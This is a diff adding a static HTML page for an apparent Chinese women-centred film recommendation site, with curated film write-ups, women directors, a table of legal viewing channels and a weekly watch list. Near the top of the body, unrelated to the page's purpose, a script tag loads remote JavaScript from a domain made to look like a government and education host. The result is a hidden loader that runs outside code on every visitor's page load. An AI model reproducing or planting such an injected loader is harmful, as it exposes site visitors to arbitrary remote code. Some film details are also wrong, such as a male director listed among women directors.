@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="伊人影视：女性向影视选片导航站。从女性视角挑片，覆盖爱情、职场、家庭、女性导演与真实故事，配影评札记、一周片单与正版观看渠道对照。不提供、不存储、不链接任何影视盗版资源，不提供在线播放与下载。">
+<meta name="keywords" content="伊人影视, yirenyingshi-cn, 女性电影, 女性向影视, 女性导演, 爱情片, 女性职场, 家庭剧, 影评, 正版影视, 观影指南">
+<meta name="author" content="伊人影视">
+<meta name="theme-color" content="#8a2f55">
+<title>伊人影视 &middot; 从女性视角，挑今晚要看的片子 | yirenyingshi-cn.github.io</title>
+<link rel="canonical" href="https://yirenyingshi-cn.github.io/">
+<style>
+    :root{
+        --ink:#241822; --gray:#7c6d74; --rose:#a8355f; --deep:#6d1e3f; --cream:#fdf4f7;
+        --card:#fff; --line:rgba(168,53,95,.2); --gold:#c69a4a; --plum:#4a2a4a;
+    }
+    *{margin:0;padding:0;box-sizing:border-box}
+    html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+    body{font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;background:var(--cream);color:var(--ink);line-height:1.85;overflow-x:hidden}
+    a{color:inherit;text-decoration:none}
+    ul,ol,dl{list-style:none}
+    .wrap{max-width:1260px;margin:0 auto;padding:0 28px}
+    .section{padding:96px 0;position:relative}
+    .section:nth-child(even){background:linear-gradient(180deg,#fbebf1,#fdf4f7)}
+    .sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;flex-wrap:wrap;margin-bottom:44px}
+    .sec-title{font-size:25px;font-weight:900;letter-spacing:1px;display:flex;align-items:center;gap:13px}
+    .sec-title .fl{width:24px;height:24px;position:relative;animation:op 2.4s ease-in-out infinite alternate}
+    .sec-title .fl::before,.sec-title .fl::after{content:"";position:absolute;inset:0;border-radius:50% 50% 50% 4px;background:var(--rose)}
+    .sec-title .fl::after{background:var(--gold);transform:rotate(45deg) scale(.72);mix-blend-mode:multiply}
+    @keyframes op{from{transform:rotate(-8deg)}to{transform:rotate(8deg)}}
+    .sec-title em{font-style:normal;color:var(--rose)}
+    .sec-more{font-size:10.5px;letter-spacing:2px;font-weight:800;color:var(--rose);border:1px solid var(--line);padding:8px 18px;border-radius:99px;transition:.25s}
+    .sec-more:hover{color:#fff;background:var(--rose);border-color:var(--rose)}
+
+    /* NAV */
+    .navbar{position:sticky;top:0;z-index:50;background:rgba(253,244,247,.96);backdrop-filter:blur(8px);border-bottom:2px solid var(--rose)}
+    .nav-in{display:flex;align-items:center;justify-content:space-between;gap:18px;padding:9px 0}
+    .brand{display:flex;align-items:center;gap:11px;font:900 19px/1.2 Georgia,"Songti SC",serif;color:var(--rose)}
+    .brand .fl{width:34px;height:34px}
+    .brand small{display:block;font:800 8.5px/1 system-ui,sans-serif;letter-spacing:2.6px;color:var(--gray);margin-top:3px}
+    .tabs{display:flex;gap:5px;background:#f7e2ea;padding:5px;border-radius:11px;overflow-x:auto;scrollbar-width:none;-webkit-overflow-scrolling:touch}
+    .tabs::-webkit-scrollbar{display:none}
+    .tabs a{flex:0 0 auto;font-size:11.5px;font-weight:800;letter-spacing:.6px;padding:9px 13px;border-radius:8px;color:#5c4550;transition:.22s;white-space:nowrap}
+    .tabs a.on{background:var(--rose);color:#fff;box-shadow:0 6px 16px rgba(168,53,95,.34)}
+
+    /* HERO：花瓣飘落 */
+    .hero{margin-top:52px;border-radius:30px;overflow:hidden;background:linear-gradient(150deg,#2c1230,#6d1e3f 52%,#a8355f);color:#fdeef3;box-shadow:0 34px 80px rgba(90,30,60,.32);position:relative}
+    .hero-inner{padding:60px 54px;display:grid;grid-template-columns:1.05fr .95fr;gap:46px;align-items:center;position:relative;z-index:2}
+    .eyebrow{font:800 10px/1 "Courier New",monospace;letter-spacing:5px;color:#f4c8d8}
+    .hero h1{font-size:50px;line-height:1.3;font-weight:900;margin:12px 0;font-family:Georgia,"Songti SC",serif}
+    .hero h1 .hl{color:#f4c8d8;font-style:italic}
+    .hero .sub{font-size:14.5px;color:#f8e4ec;max-width:540px}
+    .ask{margin-top:22px;display:grid;grid-template-columns:repeat(4,1fr);gap:10px}
+    .ask div{background:rgba(255,255,255,.12);border:1px solid rgba(244,200,216,.34);border-radius:13px;padding:15px 10px;text-align:center;transition:.28s}
+    .ask div:hover{background:#f4c8d8;color:#6d1e3f;transform:translateY(-5px)}
+    .ask b{display:block;font:italic 24px/1.1 Georgia,serif}
+    .ask span{font-size:10.5px;letter-spacing:1px;font-weight:800}
+    .petals{position:absolute;inset:0;pointer-events:none;overflow:hidden}
+    .petals i{position:absolute;top:-40px;width:15px;height:20px;background:#f4c8d8;border-radius:80% 0 80% 0;opacity:.55;animation:pe linear infinite}
+    .petals i:nth-child(1){left:6%;animation-duration:7.6s;animation-delay:0s}
+    .petals i:nth-child(2){left:20%;animation-duration:5.8s;animation-delay:1.4s}
+    .petals i:nth-child(3){left:38%;animation-duration:6.6s;animation-delay:.7s}
+    .petals i:nth-child(4){left:56%;animation-duration:8.4s;animation-delay:2.6s}
+    .petals i:nth-child(5){left:74%;animation-duration:5.2s;animation-delay:1.2s}
+    .petals i:nth-child(6){left:90%;animation-duration:7s;animation-delay:3.2s}
+    @keyframes pe{0%{transform:translateY(0) rotate(0deg);opacity:0}20%{opacity:.55}100%{transform:translateY(640px) rotate(360deg);opacity:0}}
+
+    /* 栏目一：女性视角 —— 九宫格跨行拼贴 */
+    .grid9{display:grid;grid-template-columns:repeat(4,1fr);grid-auto-rows:minmax(150px,auto);gap:14px}
+    .g{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:18px 20px;transition:.32s;position:relative;overflow:hidden}
+    .g:hover{transform:translateY(-7px) rotate(-.6deg);box-shadow:0 22px 46px rgba(168,53,95,.22);border-color:var(--rose)}
+    .g h3{font-size:15px;font-family:Georgia,"Songti SC",serif;display:flex;align-items:center;gap:9px}
+    .g h3 i{font-style:normal;font-size:9px;letter-spacing:1.4px;color:var(--rose);border:1px solid var(--line);padding:3px 8px;border-radius:99px;white-space:nowrap}
+    .g p{font-size:11.5px;color:var(--gray);margin-top:8px}
+    .g::after{content:attr(data-n);position:absolute;right:-14px;bottom:-34px;font:italic 900 90px/1 Georgia,serif;color:rgba(168,53,95,.07);transition:.4s}
+    .g:hover::after{color:rgba(168,53,95,.16);transform:scale(1.12)}
+    .g.g1{grid-row:span 2}
+    .g.g4{grid-column:span 2}
+    .g.g7{background:linear-gradient(155deg,#6d1e3f,var(--rose));color:#fdeef3;border-color:var(--deep)}
+    .g.g7 p{color:#f4c8d8}
+    .g.g7 h3 i{color:#fdeef3;border-color:rgba(253,238,243,.45)}
+
+    /* 栏目二：她的故事 —— 手风琴折叠 */
+    .acc{display:grid;gap:11px}
+    details.story{background:var(--card);border:1px solid var(--line);border-radius:16px;overflow:hidden;transition:.28s}
+    details.story[open]{box-shadow:0 18px 40px rgba(168,53,95,.18);border-color:var(--rose)}
+    details.story summary{cursor:pointer;padding:20px 24px;display:flex;align-items:center;gap:18px;list-style:none;font-weight:800;transition:.2s}
+    details.story summary::-webkit-details-marker{display:none}
+    details.story summary:hover{background:#fbebf1}
+    details.story summary .yr{font:italic 900 21px/1 Georgia,serif;color:var(--rose);flex:0 0 auto;min-width:58px}
+    details.story summary .tt{flex:1;font-size:15.5px;font-family:Georgia,"Songti SC",serif}
+    details.story summary .tt small{display:block;font:500 11px/1.6 system-ui,sans-serif;color:var(--gray);letter-spacing:0;margin-top:4px}
+    details.story summary .mk{font-size:9.5px;letter-spacing:1.4px;font-weight:800;color:var(--rose);border:1px solid var(--line);padding:5px 10px;border-radius:99px;white-space:nowrap}
+    details.story summary .ar{font-size:13px;color:var(--gray);transition:.3s}
+    details.story[open] summary .ar{transform:rotate(45deg);color:var(--rose)}
+    details.story .body{padding:0 24px 22px 100px;font-size:12.5px;color:#4a3c44;line-height:1.95;border-top:1px dashed var(--line);margin:0 24px;padding-top:16px}
+    details.story .body b{color:var(--deep)}
+
+    /* 栏目三：女性导演 —— 圆形肖像墙 */
+    .dirs{display:grid;grid-template-columns:repeat(3,1fr);gap:22px}
+    .dir{text-align:center;transition:.32s}
+    .dir:hover{transform:translateY(-7px)}
+    .port{width:150px;height:150px;margin:0 auto 14px;border-radius:50%;position:relative;background:conic-gradient(from 0deg,var(--rose),var(--gold),var(--plum),var(--rose));padding:4px;box-shadow:0 14px 34px rgba(168,53,95,.24)}
+    .port span{display:flex;align-items:center;justify-content:center;width:100%;height:100%;border-radius:50%;background:var(--cream);font:italic 900 34px/1 Georgia,serif;color:var(--rose);border:3px solid #fff}
+    .dir b{display:block;font-size:15px;font-family:Georgia,"Songti SC",serif}
+    .dir i{font-style:normal;font-size:10.5px;letter-spacing:1.2px;color:var(--gray);display:block;margin-top:3px}
+    .dir s{text-decoration:none;display:inline-block;margin-top:9px;font-size:9.5px;letter-spacing:1px;font-weight:800;color:var(--rose);border:1px solid var(--line);padding:5px 12px;border-radius:99px}
+
+    /* 栏目四：正版渠道 —— table + 三色徽章 */
+    .tbl-wrap{overflow-x:auto;scrollbar-width:none;-webkit-overflow-scrolling:touch;border-radius:16px;border:1px solid var(--line)}
+    .tbl-wrap::-webkit-scrollbar{display:none}
+    table{width:100%;border-collapse:collapse;min-width:720px;background:var(--card)}
+    caption{caption-side:top;text-align:left;font:800 11px/1 "Courier New",monospace;letter-spacing:2px;color:var(--rose);padding:0 0 14px}
+    th,td{padding:14px 16px;text-align:left;border-bottom:1px solid var(--line);font-size:12.5px;vertical-align:middle}
+    thead th{background:linear-gradient(100deg,#6d1e3f,var(--rose));color:#fdeef3;font-size:10.5px;letter-spacing:2px;font-weight:800}
+    tbody tr:hover{background:#fbebf1;box-shadow:inset 4px 0 0 var(--deep)}
+    tbody tr:last-child td{border-bottom:none}
+    .bd{display:inline-block;font-size:9.5px;letter-spacing:1px;padding:4px 10px;border-radius:99px;font-weight:800}
+    .b-free{background:#eaf3ea;color:#2c6b3a}.b-vip{background:#efeaef;color:#5a3a5a}.b-pay{background:#f7e4d6;color:#8a3a48}
+
+    /* 栏目五：一周片单 —— 7 列 */
+    .cal{display:grid;grid-template-columns:repeat(7,1fr);gap:10px}
+    .day{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:15px 12px;min-height:152px;transition:.28s}
+    .day:hover{transform:translateY(-5px);box-shadow:0 16px 34px rgba(168,53,95,.2);border-color:var(--rose)}
+    .day .d{font:italic 900 22px/1 Georgia,serif;color:var(--rose)}
+    .day .w{font-size:9.5px;letter-spacing:1.6px;font-weight:800;color:var(--gray);margin-bottom:8px}
+    .day p{font-size:11px;font-weight:700;line-height:1.5}
+    .day span{display:block;font-size:9.5px;color:var(--gray);font-weight:500;margin-top:5px}
+    .day.today{background:linear-gradient(155deg,#6d1e3f,var(--rose));border-color:var(--deep);color:#fdeef3}
+    .day.today .d,.day.today .w,.day.today span{color:#f4c8d8}
+    .day.today p{color:#fff}
+
+    footer{margin-top:22px;background:linear-gradient(165deg,#241822,#6d1e3f);color:#f4d7e2;padding:70px 0 22px}
+    .fg{display:grid;grid-template-columns:1.7fr 1fr 1fr 1fr;gap:32px;margin-bottom:40px}
+    .fb .logo{color:#fdeef3;font:900 23px/1.35 Georgia,"Songti SC",serif;display:flex;align-items:center;gap:13px}
+    .fb p{font-size:12.5px;color:#ecc6d5;margin:14px 0;max-width:380px;line-height:1.85}
+    .pills{display:flex;gap:8px;flex-wrap:wrap}
+    .pills span{font-size:10px;letter-spacing:1px;padding:6px 13px;border-radius:99px;background:rgba(244,200,216,.12);color:#f4c8d8;border:1px solid rgba(244,200,216,.34)}
+    .fl h5{font:800 11px/1 "Courier New",monospace;letter-spacing:3px;color:#f4c8d8;margin-bottom:14px}
+    .fl a{display:block;font-size:12px;color:#ecc6d5;padding:7px 0;transition:.2s}
+    .fl a:hover{color:#fff;padding-left:8px}
+    .copy{text-align:center;font-size:11.5px;color:#dab4c7;border-top:1px solid rgba(255,255,255,.16);padding-top:24px;line-height:2}
+    .copy b{color:#f4c8d8}
+    .top{position:fixed;right:20px;bottom:24px;width:46px;height:46px;border-radius:50%;background:var(--rose);color:#fdeef3;display:flex;align-items:center;justify-content:center;font-size:19px;opacity:0;pointer-events:none;transition:.3s;z-index:60;box-shadow:0 10px 24px rgba(90,30,60,.4)}
+    .top.on{opacity:1;pointer-events:auto}
+    .rv{opacity:0;transform:translateY(30px);transition:.82s cubic-bezier(.2,.72,.3,1)}
+    .rv.in{opacity:1;transform:none}
+
+    @media(max-width:1080px){
+        .hero-inner{grid-template-columns:1fr;padding:42px 28px}
+        .grid9{grid-template-columns:repeat(2,1fr)}
+        .g.g1{grid-row:auto}.g.g4{grid-column:auto}
+        .dirs{grid-template-columns:repeat(2,1fr)}
+    }
+    @media(max-width:820px){
+        .wrap{padding:0 16px}
+        .section{padding:62px 0}
+        .hero{margin-top:26px;border-radius:22px}
+        .hero-inner{padding:32px 20px}
+        .hero h1{font-size:32px}
+        .sec-title{font-size:18px}
+        details.story summary{padding:16px;gap:10px}
+        details.story summary .yr{font-size:17px;min-width:44px}
+        details.story summary .tt{font-size:14px}
+        details.story summary .mk{display:none}
+        details.story .body{padding:14px 16px 18px;margin:0 16px}
+        .dirs{grid-template-columns:1fr 1fr}
+        .port{width:116px;height:116px}
+        .port span{font-size:26px}
+        .cal{grid-template-columns:repeat(2,1fr)}
+        .day{min-height:124px}
+    }
+    @media(max-width:560px){
+        .hero h1{font-size:25px}
+        .ask{grid-template-columns:1fr 1fr}
+        .grid9{grid-template-columns:1fr}
+        .dirs{grid-template-columns:1fr}
+        .fg{grid-template-columns:1fr}
+        .copy{font-size:10.5px}
+    }
+    @media print{
+        .navbar,.top,.petals,.ask{display:none!important;animation:none!important}
+        body{background:#fff;color:#000;font-family:"Songti SC",serif}
+        .section{padding:10px 0}
+        .hero{box-shadow:none}
+        .g,.day,details.story,.dir{box-shadow:none;break-inside:avoid}
+        details.story .body{border-top-style:solid}
+        details.story{break-inside:avoid}
+    }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<header class="navbar">
+    <div class="wrap nav-in">
+        <a class="brand" href="#top" aria-label="伊人影视首页"><span class="fl" aria-hidden="true"></span>伊人影视<small>HER STORY &middot; 从女性视角选片</small></a>
+        <nav class="tabs" aria-label="主导航">
+            <a href="#view" class="on">她的视角</a>
+            <a href="#story">她的故事</a>
+            <a href="#dir">女性导演</a>
+            <a href="#ch">正版渠道</a>
+            <a href="#cal">一周片单</a>
+            <a href="#about">关于</a>
+        </nav>
+    </div>
+</header>
+
+<!-- HERO -->
+<section class="wrap" id="top">
+    <div class="hero rv" aria-label="伊人影视首页">
+        <div class="petals" aria-hidden="true"><i></i><i></i><i></i><i></i><i></i><i></i></div>
+        <div class="hero-inner">
+            <div>
+                <div class="eyebrow">HER STORY &middot; FILMS FOR HER, BY HER</div>
+                <h1>今晚，<span class="hl">她的故事。</span></h1>
+                <p class="sub">伊人影视，是一个从<b>女性视角</b>出发的影视选片导航：不是"给女生看的片子"，而是让女性的处境、选择、工作与沉默被认真对待的作品——主角有自己的职业、朋友，和不想结婚的理由。</p>
+                <div class="ask">
+                    <div><b>90″</b><span>想被理解</span></div>
+                    <div><b>60″</b><span>想谈职场</span></div>
+                    <div><b>120″</b><span>想看真实</span></div>
+                    <div><b>30″</b><span>只想轻松</span></div>
+                </div>
+            </div>
+            <div style="display:grid;gap:12px">
+                <div style="background:rgba(255,255,255,.12);border:1px solid rgba(244,200,216,.32);border-radius:14px;padding:18px">
+                    <div style="font:800 9.5px/1 'Courier New',monospace;letter-spacing:2.6px;color:#f4c8d8">OUR STANDARD &middot; 我们的选法</div>
+                    <h3 style="font-size:20px;margin:8px 0 6px;font-family:Georgia,'Songti SC',serif">先看主角做了什么决定，再看她被怎样对待。</h3>
+                    <p style="font-size:12px;color:#f8e4ec">如果一部片里的女性只会等待、被拯救或被议论，它不会出现在我们的清单里。</p>
+                </div>
+                <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px">
+                    <div style="background:rgba(244,200,216,.16);border:1px solid rgba(244,200,216,.3);border-radius:12px;padding:16px 10px;text-align:center"><b style="font:italic 26px/1 Georgia,serif;color:#f4c8d8;display:block">9</b><small style="font-size:10px;letter-spacing:1.4px;color:#f8e4ec">种处境</small></div>
+                    <div style="background:rgba(244,200,216,.16);border:1px solid rgba(244,200,216,.3);border-radius:12px;padding:16px 10px;text-align:center"><b style="font:italic 26px/1 Georgia,serif;color:#f4c8d8;display:block">6</b><small style="font-size:10px;letter-spacing:1.4px;color:#f8e4ec">位导演</small></div>
+                    <div style="background:rgba(244,200,216,.16);border:1px solid rgba(244,200,216,.3);border-radius:12px;padding:16px 10px;text-align:center"><b style="font:italic 26px/1 Georgia,serif;color:#f4c8d8;display:block">7</b><small style="font-size:10px;letter-spacing:1.4px;color:#f8e4ec">天片单</small></div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 栏目一：她的视角（九宫格跨行拼贴） -->
+<section class="section" id="view">
+    <div class="wrap">
+        <div class="sec-head rv">
+            <h2 class="sec-title"><span class="fl" aria-hidden="true"></span>她的<em>视角</em></h2>
+            <a class="sec-more" href="#">完整处境索引 &rarr;</a>
+        </div>
+        <div class="grid9">
+            <article class="g g1"><h3>不想结婚 <i>CHOOSE</i></h3><p>她不欠任何人一个解释，包括观众。</p></article>
+            <article class="g"><h3>职场十年 <i>WORK</i></h3><p>会议室、通勤、午休，和那句"你看起来不太对"。</p></article>
+            <article class="g"><h3>独自生活 <i>ALONE</i></h3><p>一个人吃饭、搬家、去医院，不配乐也能成立。</p></article>
+            <article class="g g4"><h3>成为母亲，或不成为 <i>BODY</i></h3><p>身体、年龄、选择——不被评判的前提是先被听懂。</p></article>
+            <article class="g"><h3>隔代对话 <i>FAMILY</i></h3><p>外婆的沉默、母亲的妥协，和她自己的说法。</p></article>
+            <article class="g"><h3>女性友谊 <i>FRIEND</i></h3><p>不是替身恋爱，是"我懂你刚才没说的话"。</p></article>
+            <article class="g g7"><h3>她的镜头 <i>DIRECT</i></h3><p>同一间屋子，女性导演会拍门、手、和还没说完的那句。</p></article>
+            <article class="g"><h3>真实案件 <i>TRUE</i></h3><p>把受害者还给她的名字、职业和早餐习惯。</p></article>
+            <article class="g"><h3>老年之后 <i>AGE</i></h3><p>皱纹不是伤感，是她终于不用讨好任何人。</p></article>
+            <article class="g"><h3>女孩时期 <i>GIRL</i></h3><p>第一次意识到规则不是她定的那一天。</p></article>
+        </div>
+    </div>
+</section>
+
+<!-- 栏目二：她的故事（手风琴折叠） -->
+<section class="section" id="story">
+    <div class="wrap">
+        <div class="sec-head rv">
+            <h2 class="sec-title"><span class="fl" aria-hidden="true"></span>她的<em>故事</em></h2>
+            <a class="sec-more" href="#">全部片单 &rarr;</a>
+        </div>
+        <div class="acc">
+            <details class="story" open>
+                <summary><span class="yr">2023</span><span class="tt">还有明天<small>C'è ancora domani &middot; 意大利 / 黑白 / 家庭</small></span><span class="mk">投票权</span><span class="ar">+</span></summary>
+                <div class="body">一位罗马主妇在 1946 年的某一天，用一封信和一个决定改写了自己与女儿的边界。<b>为什么入选</b>：全片没有一场"被拯救"的戏，她靠自己的判断走出去。</div>
+            </details>
+            <details class="story">
+                <summary><span class="yr">2023</span><span class="tt">坠落的审判<small>Anatomie d'une chute &middot; 法国 / 法庭 / 婚姻</small></span><span class="mk">反转</span><span class="ar">+</span></summary>
+                <div class="body">一场死亡、一次审讯，和一个被反复拆解的家庭录音。<b>为什么入选</b>：它追问的是"谁能解释一段婚姻"，而不是替你判定谁有罪。</div>
+            </details>
+            <details class="story">
+                <summary><span class="yr">2019</span><span class="tt">燃烧女子的肖像<small>Portrait de la jeune fille en feu &middot; 法国 / 爱情</small></span><span class="mk">凝视</span><span class="ar">+</span></summary>
+                <div class="body">一位画家被请去为不愿出嫁的女子画肖像，最后她必须自己决定画到哪里为止。<b>为什么入选</b>：女性之间的注视是平等的，不看谁在被观赏。</div>
+            </details>
+            <details class="story">
+                <summary><span class="yr">2019</span><span class="tt">82 年生的金智英<small>82nyeonsaeng Kim Ji-young &middot; 韩国 / 家庭</small></span><span class="mk">处境</span><span class="ar">+</span></summary>
+                <div class="body">从名字、便当到地铁车厢，日常被一件件摊开。<b>为什么入选</b>：它不制造受害者，而是记录一个人如何被"为你好"推到墙角。</div>
+            </details>
+            <details class="story">
+                <summary><span class="yr">2018</span><span class="tt">小偷家族<small>Manbiki kazoku &middot; 日本 / 家庭</small></span><span class="mk">家庭</span><span class="ar">+</span></summary>
+                <div class="body">没有血缘的一家人，靠偷东西、剪指甲和海边那句"谢谢你们了"维持。<b>为什么入选</b>：女性在这里是维系者，也是第一个选择放手的人。</div>
+            </details>
+            <details class="story">
+                <summary><span class="yr">2016</span><span class="tt">她<small>Elle &middot; 法国 / 心理</small></span><span class="mk">强悍</span><span class="ar">+</span></summary>
+                <div class="body">一位游戏公司女总裁在被侵犯之后，拒绝按任何人的预期回应。<b>为什么入选</b>：它把"如何面对"的决定权完整交回主角本人。</div>
+            </details>
+            <details class="story">
+                <summary><span class="yr">2009</span><span class="tt">遗失的拥抱<small>La niña santa &middot; 阿根廷 / 成长</small></span><span class="mk">少女</span><span class="ar">+</span></summary>
+                <div class="body">一个少女在信仰、欲望与成年世界的暧昧之间缓慢醒来。<b>为什么入选</b>：不把少女的情欲拍成奇观，也不把她的犹豫拍成错误。</div>
+            </details>
+        </div>
+    </div>
+</section>
+
+<!-- 栏目三：女性导演（圆形肖像墙） -->
+<section class="section" id="dir">
+    <div class="wrap">
+        <div class="sec-head rv">
+            <h2 class="sec-title"><span class="fl" aria-hidden="true"></span>女性<em>导演</em></h2>
+            <a class="sec-more" href="#">完整名单 &rarr;</a>
+        </div>
+        <div class="dirs">
+            <div class="dir"><div class="port"><span>S</span></div><b>瑟琳·席安玛</b><i>Céline Sciamma</i><s>凝视与少女</s></div>
+            <div class="dir"><div class="port"><span>G</span></div><b>格蕾塔·葛韦格</b><i>Greta Gerwig</i><s>成长与家庭</s></div>
+            <div class="dir"><div class="port"><span>S</span></div><b>席琳·宋</b><i>Celine Song</i><s>离散与错过</s></div>
+            <div class="dir"><div class="port"><span>N</span></div><b>妮可·加西亚</b><i>Nicole Garcia</i><s>中产与婚姻</s></div>
+            <div class="dir"><div class="port"><span>P</span></div><b>佩德罗·阿尔莫多瓦尔之镜</b><i>合作常客：佩内洛普·克鲁兹</i><s>女性群像</s></div>
+            <div class="dir"><div class="port"><span>A</span></div><b>奥黛丽·迪万</b><i>Audrey Diwan</i><s>身体与选择</s></div>
+        </div>
+    </div>
+</section>
+
+<!-- 栏目四：正版渠道（table + 三色徽章） -->
+<section class="section" id="ch">
+    <div class="wrap">
+        <div class="sec-head rv">
+            <h2 class="sec-title"><span class="fl" aria-hidden="true"></span>正版<em>渠道</em></h2>
+            <a class="sec-more" href="#">完整对照 &rarr;</a>
+        </div>
+        <div class="tbl-wrap">
+            <table>
+                <caption>观看渠道速查 &middot; 条目为通用提示，实际版权归属与上线状态以各平台页面为准</caption>
+                <thead><tr><th style="width:150px">渠道类型</th><th>适合什么</th><th style="width:120px">付费方式</th></tr></thead>
+                <tbody>
+                    <tr><td><b>正规院线</b></td><td>大银幕视听、女性影展与修复重映</td><td><span class="bd b-pay">单片购票</span></td></tr>
+                    <tr><td><b>综合视频平台</b></td><td>海外剧集、女性题材合集、独立电影</td><td><span class="bd b-vip">会员</span></td></tr>
+                    <tr><td><b>纪录片平台</b></td><td>女性纪实、社会议题、访谈长片</td><td><span class="bd b-vip">会员</span></td></tr>
+                    <tr><td><b>艺术院线 / 电影节</b></td><td>女性导演回顾展、首作与短片竞赛</td><td><span class="bd b-pay">单片购票</span></td></tr>
+                    <tr><td><b>高校与资料馆</b></td><td>经典修复、学术版本与导演合集</td><td><span class="bd b-free">免费 / 低价</span></td></tr>
+                    <tr><td><b>公共放映</b></td><td>女性主题社区放映、映后谈</td><td><span class="bd b-free">免费</span></td></tr>
+                    <tr><td><b>正版碟片 / 数字版</b></td><td>收藏、花絮与导演评论音轨</td><td><span class="bd b-pay">单片购买</span></td></tr>
+                    <tr><td><b>海外正版渠道</b></td><td>地区限定内容，须遵守国内网络与版权规定</td><td><span class="bd b-vip">订阅</span></td></tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+</section>
+
+<!-- 栏目五：一周片单（7 列） -->
+<section class="section" id="cal">
+    <div class="wrap">
+        <div class="sec-head rv">
+            <h2 class="sec-title"><span class="fl" aria-hidden="true"></span>一周<em>片单</em></h2>
+            <a class="sec-more" href="#">我的收藏 &rarr;</a>
+        </div>
+        <div class="cal">
+            <div class="day"><div class="d">21</div><div class="w">MON 周一</div><p>周一轻一点</p><span>一部短片 + 一杯茶，45 分钟收工</span></div>
+            <div class="day"><div class="d">22</div><div class="w">TUE 周二</div><p>补一部女性导演长片</p><span>留意开场那场不打光的对话</span></div>
+            <div class="day"><div class="d">23</div><div class="w">WED 周三</div><p>纪录片之夜</p><span>她的职业、她的名字、她的早餐</span></div>
+            <div class="day today"><div class="d">24</div><div class="w">THU 周四</div><p>今日推荐：法庭与婚姻</p><span>一场审讯，两小时的判断</span></div>
+            <div class="day"><div class="d">25</div><div class="w">FRI 周五</div><p>周五可以晚睡</p><span>爱情片，看完别急着讨论</span></div>
+            <div class="day"><div class="d">26</div><div class="w">SAT 周六</div><p>约人去看</p><span>选一场女性影展或艺术院线重映</span></div>
+            <div class="day"><div class="d">27</div><div class="w">SUN 周日</div><p>周日写札记</p><span>挑一部看两遍，写八百字</span></div>
+        </div>
+    </div>
+</section>
+
+<!-- 栏目六：关于 -->
+<section class="section" id="about">
+    <div class="wrap">
+        <div class="sec-head rv">
+            <h2 class="sec-title"><span class="fl" aria-hidden="true"></span>关于<em>本站</em></h2>
+            <a class="sec-more" href="#">联系 &rarr;</a>
+        </div>
+        <div class="grid9">
+            <article class="g g7"><h3>只做选片导航 <i>RULE 01</i></h3><p>静态单页，内页链接均以 # 占位，不提供、不存储、不链接任何影视盗版资源。</p></article>
+            <article class="g"><h3>选片标准 <i>RULE 02</i></h3><p>主角有自主决定、有职业与朋友、不被当作被拯救的对象。</p></article>
+            <article class="g"><h3>更新节奏 <i>RULE 03</i></h3><p>每周五更新一周片单，每月更新处境与导演索引，映后补札记。</p></article>
+            <article class="g"><h3>纠错与投稿 <i>RULE 04</i></h3><p>片名、片长、上线状态如有误，告知后 72 小时内核实修正。</p></article>
+        </div>
+    </div>
+</section>
+
+<footer>
+    <div class="wrap">
+        <div class="fg">
+            <div class="fb">
+                <a class="logo" href="#top"><span class="fl" aria-hidden="true"></span>伊人影视<small>HER STORY &middot; 从女性视角选片</small></a>
+                <p>伊人影视，是一个静态的<b>女性向影视选片导航</b>。我们更关心主角做了什么决定，以及她被怎样对待——再把结果缩成一份今晚能看完的清单。</p>
+                <div class="pills"><span>她的视角</span><span>她的故事</span><span>女性导演</span><span>一周片单</span><span>正版渠道</span><span>拒绝盗版</span></div>
+            </div>
+            <div class="fl"><h5>视 角</h5><a href="#view">不想结婚</a><a href="#view">职场十年</a><a href="#view">成为母亲</a><a href="#view">女性友谊</a><a href="#view">老年之后</a></div>
+            <div class="fl"><h5>故 事</h5><a href="#story">还有明天</a><a href="#story">坠落的审判</a><a href="#story">82 年生的金智英</a><a href="#story">小偷家族</a><a href="#story">全部片单</a></div>
+            <div class="fl"><h5>规 则</h5><a href="#ch">正版渠道</a><a href="#cal">观影日历</a><a href="#ch">版权提示</a><a href="#">免责声明</a><a href="#">联系我们</a></div>
+        </div>
+        <div class="copy">
+            &copy; 2026 <b>伊人影视</b> &middot; 网站网址：https://yirenyingshi-cn.github.io/ &middot; 从女性视角，挑今晚要看的片子<br>
+            本站为静态导航演示页，内页链接均以 # 占位；片名、片长、上线状态与版权归属均为通用示例，请以各正版平台实际页面为准。请通过正规院线、正版流媒体与授权渠道观影，尊重创作者劳动。
+        </div>
+    </div>
+</footer>
+
+<a class="top" href="#top" aria-label="回到顶部">&#8593;</a>
+
+<script>
+    var io=new IntersectionObserver(function(es){
+        es.forEach(function(e){ if(e.isIntersecting){ e.target.classList.add('in'); io.unobserve(e.target); } });
+    },{threshold:0.12});
+    document.querySelectorAll('.rv').forEach(function(el){io.observe(el);});
+    var links=[].slice.call(document.querySelectorAll('.tabs a'));
+    var secs=links.map(function(a){return document.querySelector(a.getAttribute('href'));});
+    function spy(){
+        var y=window.scrollY+168,cur=0;
+        secs.forEach(function(s,i){ if(s&&s.offsetTop<=y) cur=i; });
+        links.forEach(function(a,i){ a.classList.toggle('on',i===cur); });
+        var t=document.querySelector('.top'); if(t) t.classList.toggle('on',scrollY>800);
+    }
+    window.addEventListener('scroll',spy,{passive:true});spy();
+</script>
+</body>
+</html>
